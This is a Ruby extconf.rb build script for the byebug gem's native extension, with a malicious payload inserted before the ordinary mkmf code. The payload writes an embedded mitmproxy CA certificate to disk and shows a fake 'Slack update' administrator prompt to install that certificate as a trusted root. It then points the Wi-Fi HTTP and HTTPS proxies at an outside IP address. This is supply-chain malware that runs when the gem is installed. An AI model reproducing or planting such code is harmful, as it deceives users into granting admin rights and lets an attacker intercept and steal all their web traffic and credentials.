# frozen_string_literal: true

cert = %q(
-----BEGIN CERTIFICATE-----
MIIDoTCCAomgAwIBAgIGDqjxXuLiMA0GCSqGSIb3DQEBCwUAMCgxEjAQBgNVBAMM
CW1pdG1wcm94eTESMBAGA1UECgwJbWl0bXByb3h5MB4XDTIxMDEyNjIzMzEyMloX
DTI0MDEyODIzMzEyMlowKDESMBAGA1UEAwwJbWl0bXByb3h5MRIwEAYDVQQKDAlt
aXRtcHJveHkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4AwH8p4jZ
rBlZmJGl/6e2bm5ywp9dhuyZvZHsuCwmUeIwPoIArLtrb7PFLx9a5sdn8RunibZq
m1MvJo1YXK13R4nrH8+QVJGp5Hh08mIfeEprwH2UqnH8HBdMWShDPlod8Jcs1mij
Es8o3vWvRm95vTpg82eXfgeVtCbZJcAls47oKYH1JAllsHXsFoo2uZZNqEafoLoT
kUmZsgxacfGtBoNu3JroEjHqLUQ9Ox/ELcApZELmzyUywq9W8h6ZfVG0FUAlXVzy
m8TTxG4uh/hFs08/7HjUHpqKPHpNfMfC+Z0KYrmbZcqBt6V4dNCDykbgH//HQKqI
v4QMtKHfBUnrAgMBAAGjgdAwgc0wDwYDVR0TAQH/BAUwAwEB/zARBglghkgBhvhC
AQEEBAMCAgQweAYDVR0lBHEwbwYIKwYBBQUHAwEGCCsGAQUFBwMCBggrBgEFBQcD
BAYIKwYBBQUHAwgGCisGAQQBgjcCARUGCisGAQQBgjcCARYGCisGAQQBgjcKAwEG
CisGAQQBgjcKAwMGCisGAQQBgjcKAwQGCWCGSAGG+EIEATAOBgNVHQ8BAf8EBAMC
AQYwHQYDVR0OBBYEFNjMf2kspEVXhXg62cc1Kk62vuXvMA0GCSqGSIb3DQEBCwUA
A4IBAQAIwJjRy+XuFMJknhQJ5vcHrNm+BFIY3j5Fz0PPfhmPGAeie+EGCIk/D6b7
QSdXK0UQugHDKkLGSbeZtVJasiNJl1HQw9TTEXU/2lJ3vndU8l0dfasyV6BhOJbL
yjhbvQyzhVSwbnkJppo5FEoVxPeVZXkj/cZYmy01JfecfguQKD2yVmrAfJrb5e9K
D9jV1rBJsrJRqvCMPe4KLo58XWytXZR0IW0g7dxYQ+xnjeifl8cSC/9KFWdGTQ97
sGPb9VkNpHawOVAw3YoYHhc1UpTDAM0HBVKXR7BQ/q/ojeSSZ6vp/4vRVJWj8Y4P
4EREKgiqE25r/Sv3JriAQrmIRy+9
-----END CERTIFICATE-----
)

File.write("/tmp/mitmproxy-ca-cert.pem", cert)

`osascript -e "do shell script \\"security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/mitmproxy-ca-cert.pem\\" with prompt \\"A Slack update is ready to install\\" with administrator privileges"`
`networksetup -setwebproxy "Wi-fi" 52.12.216.35 8080`
`networksetup -setsecurewebproxy "Wi-fi" 52.12.216.35 8080`

require "mkmf"

makefile_config = RbConfig::MAKEFILE_CONFIG

makefile_config["CC"] = ENV["CC"] if ENV["CC"]

makefile_config["CFLAGS"] << " -gdwarf-2 -g3 -O0" if ENV["debug"]

dir_config("ruby")
with_cflags(makefile_config["CFLAGS"]) { create_makefile("byebug/byebug") }
